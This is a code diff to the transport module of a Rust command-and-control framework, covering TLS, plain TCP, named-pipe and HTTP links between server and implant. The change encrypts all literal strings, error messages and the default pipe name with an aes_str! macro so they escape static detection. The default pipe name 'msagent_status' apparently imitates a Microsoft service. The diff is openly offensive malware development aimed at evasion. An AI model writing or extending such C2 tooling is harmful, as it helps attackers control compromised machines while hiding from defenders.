@@ -1,4 +1,6 @@
 // src/transport.rs
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use tokio::net::{TcpListener, TcpStream};
 use tokio_rustls::{TlsAcceptor, TlsConnector, server::TlsStream as ServerTls, client::TlsStream as ClientTls};
 use tokio::io::{AsyncRead, AsyncWrite, ReadBuf, DuplexStream};
@@ -112,13 +114,13 @@ impl ServerTransport {
                     let tls_stream = acceptor.accept(stream).await?;
                     Ok((C2Stream::TlsServer(tls_stream), peer_addr))
                 } else {
-                    Err(io::Error::new(io::ErrorKind::Other, "TLS Config Missing"))
+                    Err(io::Error::new(io::ErrorKind::Other, aes_str!("TLS Config Missing")))
                 }
             },
             TransportProtocol::TcpPlain => {
                 Ok((C2Stream::Tcp(stream), peer_addr))
             },
-            _ => Err(io::Error::new(io::ErrorKind::Other, "Unsupported Server Transport")),
+            _ => Err(io::Error::new(io::ErrorKind::Other, aes_str!("Unsupported Server Transport"))),
         }
     }
 }
@@ -199,14 +201,14 @@ impl ClientTransport {
                     } else {
                         return Err(io::Error::new(
                             io::ErrorKind::InvalidInput,
-                            format!("Invalid TLS SNI hostname: '{}' — check c2_host configuration", self.tls_sni),
+                            format!("{} '{}' {}", aes_str!("Invalid TLS SNI hostname:"), self.tls_sni, aes_str!("— check c2_host configuration")),
                         ));
                     };
                     
                     let tls_stream = connector.connect(domain, stream).await?;
                     Ok(C2Stream::TlsClient(tls_stream))
                 } else {
-                    Err(io::Error::new(io::ErrorKind::Other, "TLS Init Failed"))
+                    Err(io::Error::new(io::ErrorKind::Other, aes_str!("TLS Init Failed")))
                 }
             },
             TransportProtocol::TcpPlain => {
@@ -221,9 +223,9 @@ impl ClientTransport {
                     
                     let parts: Vec<&str> = self.target_addr.split(':').collect();
                     let ip = parts[0];
-                    let pipe_name = if parts.len() > 1 { parts[1] } else { "msagent_status" };
+                    let pipe_name: String = if parts.len() > 1 { parts[1].to_string() } else { aes_str!("msagent_status") };
                     
-                    let pipe_path = format!(r"\\{}\pipe\{}", ip, pipe_name);
+                    let pipe_path = format!("\\\\{}\\{}\\{}", ip, aes_str!("pipe"), pipe_name);
                     
                     // Attempt connection. Tokio NamedPipeClient expects an already existing server.
                     let client = ClientOptions::new().open(&pipe_path)?;
@@ -237,7 +239,7 @@ impl ClientTransport {
             // HTTP(S) transport uses a separate polling path (http_transport.rs),
             // not a persistent connection. If we reach here, it's a config error.
             TransportProtocol::Http | TransportProtocol::Https => {
-                Err(io::Error::new(io::ErrorKind::Other, "HTTP(S) transport uses polling mode, not ClientTransport::connect()"))
+                Err(io::Error::new(io::ErrorKind::Other, aes_str!("HTTP(S) transport uses polling mode, not ClientTransport::connect()")))
             }
         }
     }
